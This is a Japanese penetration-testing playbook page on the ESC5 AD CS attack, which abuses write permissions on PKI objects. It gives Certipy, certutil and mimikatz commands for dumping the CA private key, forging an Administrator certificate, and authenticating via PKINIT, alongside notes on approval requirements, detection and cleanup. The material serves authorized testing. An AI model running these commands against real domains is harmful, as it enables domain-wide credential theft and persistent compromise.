# ESC5 — PKI オブジェクトへの過剰な Write ACL

> **[HIGH IMPACT]** 本攻撃は以下の理由で本番では原則禁止または個別合意必須：
> - [x] 不可逆な設定変更を含む（CA オブジェクト・PKI コンテナへの書き込みはドメイン全体のPKI 基盤に影響）
> - [x] 持続化に該当（発行した証明書・配置した CA 証明書はパスワード変更後も有効）
> - [x] SIEM/EDR で確実に検知される（Event ID 4662・4886・4887・MDI アラート）
> - [x] 業務停止リスク（CA オブジェクトの誤操作は PKI 全体の停止につながる）
>
> 実施可否は事前合意で明示確認すること。CA オブジェクトへの変更は書面承認必須。
> 演習環境では制約なし。

---

## 着火条件

以下のいずれかが Certipy の出力で確認できるときに実施する：

- `[!] Vulnerabilities: ESC5` が表示されている
- または低権限ユーザーが以下の AD オブジェクトのいずれかに Write 権限を持つ：
  - **CA サーバーオブジェクト**（`CN=<CA_NAME>,CN=Enrollment Services,...`）の `WriteProperty` / `GenericAll` / `GenericWrite`
  - **NTAuthCertificates** オブジェクト（`CN=NTAuthCertificates,CN=Public Key Services,...`）の `WriteProperty`
  - **RootCA** オブジェクト（`CN=<CA_NAME>,CN=Certification Authorities,...`）への Write 権限
  - **CA ホストコンピューターオブジェクト**（`CN=<CA_SERVER>,CN=Computers,...`）への GenericAll

**攻撃者の思考トレース：** ESC4 がテンプレートオブジェクトへの書き込みなら、ESC5 は PKI 基盤オブジェクト自体への書き込み。最も深刻なのは NTAuthCertificates への Write で、ここに自分が生成した不正 CA の証明書を追加すれば、その不正 CA が発行したどんな証明書でも PKINIT に使えるようになる。CA ホストへの GenericAll があれば RBCD 経由でシステム権限を奪取してから CA 設定を直接操作できる。

---

## 環境前提

- **実行環境**: テスター端末（対象 Write 権限を持つドメインユーザーとして認証済み）
- **必要なツール**: Certipy（`pip install certipy-ad --break-system-packages`）、Impacket スイート（ペネトレ用 Linux ディストリ標準搭載）
- **必要な権限**: 各 PKI オブジェクトへの Write 権限（低権限ユーザーへの誤付与が条件）
- **オフライン代替**: `bloodyAD` / `ldapmodify` による手動 LDAP 属性変更

---

## 観点・着眼点

ESC5 は攻撃対象オブジェクトによって悪用手法が大きく異なる。以下の優先順位で確認する：

| 対象オブジェクト | Write 権限の意味 | 直接の成果 |
|---------------|--------------|-----------|
| CA ホストコンピューターオブジェクトへの GenericAll | RBCD 設定 → CA サーバーに SYSTEM 権限でアクセス | CA 秘密鍵の取得・設定直接変更 |
| NTAuthCertificates への WriteProperty | 不正 CA 証明書の追加 → 不正 CA 発行の証明書で PKINIT が通る | 任意ユーザーとして TGT 取得 |
| CA Enrollment Services オブジェクトへの WriteProperty | CA のテンプレートリストや設定の変更 | ESC4 相当の成果 |
| RootCA オブジェクトへの Write | ルート CA 証明書の置き換え | PKI 基盤全体への影響（最高リスク） |

### 先に確認すること

```bash
# [Attacker] PKI オブジェクトの ACL 確認（ESC5 を含む）
certipy find \
  -u [USER]@[DOMAIN] \
  -p [PASSWORD] \
  -dc-ip [DC_IP] \
  -vulnerable \
  -stdout
```

ESC5 の出力例（CA ホストオブジェクトへの GenericAll）：

```
Certificate Authorities
  0
    CA Name                             : [CA_NAME]
    DNS Name                            : [CA_SERVER_FQDN]
    ...
    Permissions
      Object Control Permissions
        Owner                           : EXAMPLE.LOCAL\Domain Admins
        Write Owner Principals          : EXAMPLE.LOCAL\[LOW_PRIV_USER]
        Write Dacl Principals           : EXAMPLE.LOCAL\[LOW_PRIV_USER]
        Write Property Principals       : EXAMPLE.LOCAL\[LOW_PRIV_USER]
    [!] Vulnerabilities
      ESC5                              : 'EXAMPLE.LOCAL\[LOW_PRIV_USER]' has dangerous
                                          permissions on this CA object
```

---

## 手順

### ケース1：CA ホストコンピューターオブジェクトへの GenericAll → RBCD 経由

CA サーバーのコンピューターオブジェクトに GenericAll があれば、RBCD を設定して CA サーバーに SYSTEM 権限でアクセスできる。

RBCD の詳細手順 → `../Delegation_Attacks/RBCD.md`

SYSTEM 権限取得後、CA サーバー上で秘密鍵をダンプする：

```bash
# [Target: CA_SERVER] CA の秘密鍵ダンプ（SYSTEM 権限で実行）
# certutil で CA 証明書と秘密鍵を PFX にエクスポート
certutil -p [EXPORT_PASSWORD] -exportPFX [CA_CERT_CN] [OUTPUT.pfx]
```

または Impacket で CA サーバーのシークレットダンプ → `../Credential_Dumping.md`

### ケース2：NTAuthCertificates への WriteProperty → 不正 CA 証明書の追加

事前準備（必須）：不正 CA 証明書の生成は手順が複雑なため、Certipy の `forge` サブコマンドを使用する。

```bash
# [Attacker] Step 1: 偽造証明書の生成（CA 秘密鍵が取得できている場合）
certipy forge \
  -ca-pfx [CA].pfx \
  -upn administrator@[DOMAIN] \
  -subject "CN=Administrator"
# → administrator_forged.pfx が生成される

# [Attacker] Step 2: NTAuthCertificates に CA 証明書を追加（不要な場合はスキップ）
# ※ 通常は ESC5 の直接ターゲットにより手順が変わる

# [Attacker] Step 3: 偽造証明書で PKINIT 認証
certipy auth \
  -pfx administrator_forged.pfx \
  -dc-ip [DC_IP]
```

> **注意**: NTAuthCertificates への書き込みは AD フォレスト全体に影響する最高リスク操作。本番では実施前に必ず詳細な書面合意を取ること。

---

## 刺さらなかったとき

| 状況 | 対処 |
|------|------|
| CA ホストへの GenericAll があるが RBCD が設定できない | `MachineAccountQuota` が 0 の場合、マシンアカウントが作れない。既存のコンピューターオブジェクトを `msDS-AllowedToActOnBehalfOfOtherIdentity` に設定できるか確認 |
| CA 秘密鍵のエクスポートが拒否される | CA の秘密鍵が非エクスポート属性（CNG KSP）で保存されている。mimikatz `crypto::capi` / `lsadump::dpapi` による別アプローチ |
| ESC5 に該当するオブジェクトが特定できない | `bloodyAD search --filter '(objectClass=pKIEnrollmentService)' --attr nTSecurityDescriptor` で手動 ACL を確認 |

---

## 注意点・落とし穴

- **ESC5 の影響範囲は最も広い**：CA オブジェクトへの変更はドメイン全体・フォレスト全体に波及する場合がある
- **`NTAuthCertificates` への不正な CA 証明書追加は削除が必要**：追加した証明書はテスト完了時に必ず削除する
- **CA 秘密鍵の取得は最高リスク**：CA 秘密鍵が漏洩した場合、フォレスト全体の PKI 再構築が必要になる。取得した場合は厳重管理と即時報告が必要

---

## 本番での前提

- **事前合意の要否**: ★★★（書面承認必須・経営層承認が必要な場合も）。PKI 基盤への変更はフォレスト全体への影響
- **想定されるSIEM/EDR検知**: Event ID 4662（PKI オブジェクト変更）/ 4886・4887（証明書発行）/ MDI「疑わしいドメインコントローラーへの証明書要求」
- **業務影響リスク**: CA オブジェクトの誤操作は PKI 全体の停止につながる最高リスク
- **原状回復必須項目**: ✅ NTAuthCertificates に追加した CA 証明書の削除 / ✅ CA オブジェクトの設定復元 / ✅ 取得した CA 秘密鍵・pfx の厳重管理・テスト完了時破棄
- **取得情報の取扱**: CA 秘密鍵は最高機密扱い。暗号化保管必須。テスト完了後即時破棄・ログ記録
- **演習環境での扱い**: 制約なし（HTB / OSCP 等は本セクション全項目をスキップしてよい）

---

## 関連技術

- 前：AD CS の列挙と ESC 番号の特定 → `./Overview.md`
- 前：CA ホストへの RBCD 設定 → `../Delegation_Attacks/RBCD.md`
- 後：CA 秘密鍵取得後の証明書偽造 → PKINIT → DCSync → `../Credential_Dumping.md`
- ツール詳細 → `../../05_Tools_Reference/Certipy.md`
